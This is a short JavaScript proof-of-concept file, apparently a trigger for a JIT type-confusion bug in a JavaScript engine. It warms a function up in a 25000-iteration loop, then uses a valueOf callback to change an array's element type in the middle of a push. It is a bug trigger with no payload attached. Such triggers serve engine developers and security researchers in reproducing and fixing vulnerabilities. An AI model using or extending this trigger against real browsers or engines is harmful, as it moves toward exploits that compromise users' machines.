function poc(a1) {
    let arr = [1,2];
    const v6 = () => {
        if (a1) {
            arr[0] = 1.1;
        }
        return 3;
    };
    const trigger_obj = { valueOf: v6 };
    arr.push(trigger_obj);
}
for (let i13 = 0; i13 < 25000; i13++) {
    poc(false);
}
poc(true);
